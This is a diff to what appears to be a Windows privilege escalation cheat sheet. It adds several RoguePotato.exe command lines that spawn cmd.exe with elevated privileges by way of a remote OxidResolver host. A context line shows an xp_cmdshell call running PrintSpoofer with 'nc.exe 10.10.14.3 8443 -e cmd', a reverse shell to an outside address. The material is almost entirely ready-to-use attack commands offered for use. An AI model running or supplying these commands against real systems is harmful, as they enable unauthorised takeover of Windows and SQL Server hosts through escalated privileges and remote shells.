@@ -1623,7 +1623,13 @@ xp_cmdshell C:\Tools\PrintSpoofer.exe -c "c:\Tools\nc.exe 10.10.14.3 8443 -e cmd
 #[RoguePotato](https://github.com/antonioCoco/RoguePotato)
 
 ```
-
+#RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. Use this if you have fw restrictions.
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
+#RoguePotato all in one with RogueOxidResolver running locally on port 9999
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
+RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
+        
 ```
 
 # Windows Privilege Escalation Cheat Sheet
